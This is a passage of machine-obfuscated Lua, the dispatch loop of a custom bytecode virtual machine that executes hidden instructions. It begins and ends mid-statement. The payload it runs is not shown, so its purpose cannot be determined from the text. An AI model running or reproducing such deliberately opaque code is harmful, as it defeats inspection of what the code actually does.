A;A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;end;elseif c<=76 then if c<=73 then if c>72 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else local l=o[2];local n=o[5];local o=l+2;local f={e[l](e[l+1],e[o])};for d=1,n do e[o+d]=f[d];end;local l=e[l+3];if l then e[o]=l else d=d+1;end;end;elseif c<=74 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];elseif c==75 then local o=o[2];local d={};local l=B;for o=o+1,l do d[#d+1]=e[o];end;do return e[o](r(d,1,l-o))end;else e[o[2]]=e[o[3]]+e[o[5]];end;elseif c<=79 then if c<=77 then local A;local D,A;local c;local A;local C;local a;e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];elseif c>78 then e[o[2]]=n[o[3]]/e[o[5]];else local J;local a;local c;local C;local D;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];do return end;end;elseif c<=80 then local J;local a;local c;local C;local D;local A;e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];elseif c==81 then local l=o[2];e[l]=e[l]-e[l+2];d=d+o[3];else local l=o[2];local f=e[l+2];local n=e[l]+f;e[l]=n;if f>0 then if n<=e[l+1]then d=d+o[3];e[l+3]=n;end;elseif n>=e[l+1]then d=d+o[3];e[l+3]=n;end;end;elseif c<=123 then if c<=102 then if c<=92 then if c<=87 then if c<=84 then if c>83 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];else local l=o[2];local f={};local d=0;local n=B;for o=l+1,n do d=d+1;f[d]=e[o];end;local n={e[l](r(f,1,n-l))};local o=l+o[5]-2;d=0;for o=l,o do d=d+1;e[o]=n[d];end;B=o;end;elseif c<=85 then e[o[2]][e[o[3]]]=e[o[5]];elseif c==86 then if(e[o[2]]==n[o[5]])then d=d+1;else d=d+o[3];end;else e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=89 then if c>88 then e[o[2]]=e[o[3]][n[o[5]]];else local B=E[o[3]];local A;local n={};A=I({},{__index=function(d,o)local o=n[o];return o[1][o[2]];end,__newindex=function(e,o,d)local o=n[o]o[1][o[2]]=d;end;});for f=1,o[5]do d=d+1;local o=l[d];if o[1]==209 then n[f-1]={e,o[3]};else n[f-1]={C,o[3]};end;T[#T+1]=n;end;e[o[2]]=K(B,A,f);end;elseif c<=90 then e[o[2]]=e[o[3]]+e[o[5]];elseif c>91 then local o=o[2];local l=e[o];local d=B-o;for d=1,d do l[d]=e[o+d]end;else local A;local D,A;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];end;elseif c<=97 then if c<=94 then if c==93 then local D;local a;local A;local C;local c;e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else if(e[o[2]]~=e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=95 then do return end;elseif c>96 then e[o[2]]=e[o[3]][e[o[5]]];else e[o[2]]=K(E[o[3]],nil,f);end;elseif c<=99 then if c==98 then local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];d=d+o[3];else e[o[2]]=e[o[3]]%e[o[5]];end;elseif c<=100 then local a;local A;local c;local f;e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];f=o[2];c={};A=0;a=f+o[3]-1;for o=f+1,a do A=A+1;c[A]=e[o];end;e[f](r(c,1,a-f));B=f;d=d+1;o=l[d];do return end;elseif c==101 then local f;local A;C[o[3]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];C[o[3]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];C[o[3]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];f=e[o[3]];e[A+1]=f;e[A]=f[n[o[5]]];else local D;local C;local a;local A;local c;local f;f=o[2];c={};A=0;a=f+o[3]-1;for o=f+1,a do A=A+1;c[A]=e[o];end;e[f](r(c,1,a-f));B=f;d=d+1;o=l[d];e[o[2]]={unpack({},1,o[3])};d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];f=o[2];C=e[f];D=o[3];for o=1,D do C[o]=e[f+o]end;end;elseif c<=112 then if c<=107 then if c<=104 then if c==103 then local d=o[2];local n,l={e[d]()};local l=d+o[5]-2;local o=0;for d=d,l do o=o+1;e[d]=n[o];end;B=l;else e[o[2]]=n[o[3]];end;elseif c<=105 then local a;local S;local D,n;local A;local f;local c;local n;e[o[2]]={};d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];n=o[2];c={};f=0;A=n+o[3]-1;for o=n+1,A do f=f+1;c[f]=e[o];end;D,A=J(e[n](r(c,1,A-n)));A=A+n-1;f=0;for o=n,A do f=f+1;e[o]=D[f];end;B=A;d=d+1;o=l[d];n=o[2];S=e[n];a=B-n;for o=1,a do S[o]=e[n+o]end;elseif c>106 then local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else local J;local a;local c;local D;local C;local A;A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;e[A](r(D,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=#e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];e[A]=e[A]-e[A+2];d=d+o[3];end;elseif c<=109 then if c==108 then local a;local D;local J;local c;local f;local C;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;C[f]=e[o];end;J={e[A](r(C,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=J[f];end;B=c;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];D=o[3];a=e[D]for o=D+1,o[5]do a=a..e[o];end;e[o[2]]=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];if not e[o[2]]then d=d+1;else d=d+o[3];end;else local d=o[2];local l=e[d];local o=o[3];for o=1,o do l[o]=e[d+o]end;end;elseif c<=110 then local A,A;local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];elseif c>111 then local D;local c;local A;local C;local a;local f;f=o[2];a=e[o[3]];e[f+1]=a;e[f]=a[n[o[5]]];d=d+1;o=l[d];f=o[2];C={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;C[A]=e[o];end;D={e[f](r(C,1,c-f))};c=f+o[5]-2;A=0;for o=f,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];if(n[o[2]]<e[o[5]])then d=d+1;else d=d+o[3];end;else e[o[2]]=C[o[3]];end;elseif c<=117 then if c<=114 then if c>113 then e[o[2]]=#e[o[3]];else e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=115 then 